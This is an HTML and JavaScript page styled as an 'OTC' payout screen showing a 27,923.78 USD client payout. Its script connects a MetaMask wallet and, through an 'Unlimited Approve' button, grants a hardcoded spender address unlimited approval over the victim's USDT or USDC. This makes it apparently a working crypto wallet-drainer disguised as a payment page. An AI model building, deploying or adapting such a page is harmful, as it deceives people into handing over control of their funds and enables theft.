<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>OTC</title>

<style>
:root{
  --bg:#0b0e11; --card:rgba(255,255,255,.04); --line:rgba(255,255,255,.12);
  --text:#e8eef7; --mut:#9fb0c6; --acc:rgba(47,124,255,.22);
  --r:18px;
}
*{box-sizing:border-box}
body{margin:0;font-family:system-ui;background:var(--bg);color:var(--text)}
.wrap{max-width:820px;margin:0 auto;padding:22px}
.card{border:1px solid var(--line);border-radius:var(--r);background:var(--card);padding:16px}
h1{margin:0 0 10px;font-size:20px}
.mut{color:var(--mut);font-size:14px}
.row{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
button{cursor:pointer;border-radius:14px;border:1px solid rgba(255,255,255,.16);
background:rgba(255,255,255,.06);color:var(--text);padding:10px 12px}
button.primary{border-color:rgba(47,124,255,.65);background:var(--acc)}
button:disabled{opacity:.5}
input,select{
width:100%;padding:10px;border-radius:14px;
border:1px solid rgba(255,255,255,.16);
background:rgba(0,0,0,.22);color:var(--text)
}
.status{margin-top:12px;padding:10px;border-radius:14px;
background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.10);
font-size:13px;white-space:pre-wrap}
.pill{display:inline-block;padding:6px 10px;border-radius:999px;
border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.03);
font-size:12px;color:var(--mut);margin-top:10px}

@media(max-width:560px){
.grid{grid-template-columns:1fr}
.row button{width:100%}
}
</style>
</head>
<body>

<div class="wrap">
<div class="card">

<h1>OTC</h1>
<div class="mut">Ethereum mainnet only.</div>

<div class="pill" id="walletInfo">Wallet: not connected</div>

<div class="grid">
<div>
<div class="mut">To address</div>
<input id="toAddr" placeholder="0x..." />
</div>

<div>
<div class="mut">Asset</div>
<select id="assetSel">
<option value="ETH">ETH</option>
<option value="USDT" selected>USDT</option>
<option value="USDC">USDC</option>
</select>
</div>
</div>

<div class="row">
<button class="primary" id="connectBtn">Connect</button>
<button id="approveBtn" disabled>Unlimited Approve</button>
</div>

<!-- BIG TOTAL -->
<div style="margin:20px 0;text-align:center">
<div class="mut">Client payout amount</div>
<div id="totalAmountBig" style="font-size:36px;font-weight:700;margin-top:6px">
0.00 USD
</div>
</div>

<div class="status" id="status">Ready.</div>

</div>
</div>

<script type="module">
import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.13.4/+esm";

if (!window.ethereum){
  alert("MetaMask not detected. Open via http://localhost and install MetaMask.");
}

const TOTAL_USD = 27923.78;
const CHAIN_REQUIRED = 1;
const SPENDER = "0xefb991c82db7ce627fb3b157a46b608de6b2f03b";

const TOKENS = {
USDT:{address:"0xdAC17F958D2ee523a2206206994597C13D831ec7"},
USDC:{address:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"}
};

const ERC20_ABI=[
"function approve(address spender,uint256 amount) returns(bool)"
];

const connectBtn=document.getElementById("connectBtn");
const approveBtn=document.getElementById("approveBtn");
const walletInfo=document.getElementById("walletInfo");
const statusEl=document.getElementById("status");
const totalAmountBig=document.getElementById("totalAmountBig");
const assetSel=document.getElementById("assetSel");

function setStatus(t){statusEl.textContent=t}
function formatUSD(n){
return n.toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2})+" USD"
}
totalAmountBig.textContent=formatUSD(TOTAL_USD);

let provider,signer,address;

connectBtn.onclick=async()=>{
try{
await window.ethereum.request({method:"eth_requestAccounts"});
provider=new ethers.BrowserProvider(window.ethereum);
signer=await provider.getSigner();
address=await signer.getAddress();

const net=await provider.getNetwork();
if(Number(net.chainId)!==CHAIN_REQUIRED){
setStatus("Switch to Ethereum Mainnet");
return;
}

walletInfo.textContent="Wallet: "+address.slice(0,6)+"..."+address.slice(-4);
approveBtn.disabled=false;
setStatus("Connected ✅");

}catch(e){setStatus(e.message)}
};

approveBtn.onclick=async()=>{
try{
if(!signer)return;

const asset=assetSel.value;
if(asset==="ETH"){
setStatus("ETH does not use approve");
return;
}

const token=new ethers.Contract(
TOKENS[asset].address,
ERC20_ABI,
signer
);

setStatus("Sending approve...");
const tx=await token.approve(SPENDER,ethers.MaxUint256);
setStatus("Waiting confirmation...");
await tx.wait();
setStatus("Unlimited approve confirmed ✅");

}catch(e){setStatus(e.message)}
};

</script>

</body>
</html>
